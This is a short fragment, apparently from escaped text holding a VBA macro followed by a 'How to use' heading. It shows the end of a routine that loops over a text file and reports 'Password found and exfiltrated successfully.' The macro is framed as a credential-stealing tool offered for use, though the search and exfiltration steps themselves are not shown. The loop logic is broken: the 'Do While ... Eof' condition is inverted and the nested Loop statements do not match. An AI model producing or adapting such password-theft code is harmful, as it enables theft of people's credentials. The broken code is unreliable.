  \                Do While objTextFile.Eof\n                    line = objTextFile.ReadLine\n\
  \                Loop\n            Loop\n        Loop\n        \n       'Close the\
  \ file\n        objTextFile.Close\n        \n       'Check if a password was found\n\
  \        If passwordFound Then\n            MsgBox \"Password found and exfiltrated\
  \ successfully.\"\n        Else\n            MsgBox \"No passwords found.\"\n  \
  \      End If\n        \n    Else\n        MsgBox \"The file was not found.\"\n\
  \    End If\n    \n   'Release objects\n    Set objTextFile = Nothing\n    Set objTextFile2\
  \ = Nothing\n    Set objFSO = Nothing\n    \nEnd Sub\n```\n\n**How to use:**\n\n\
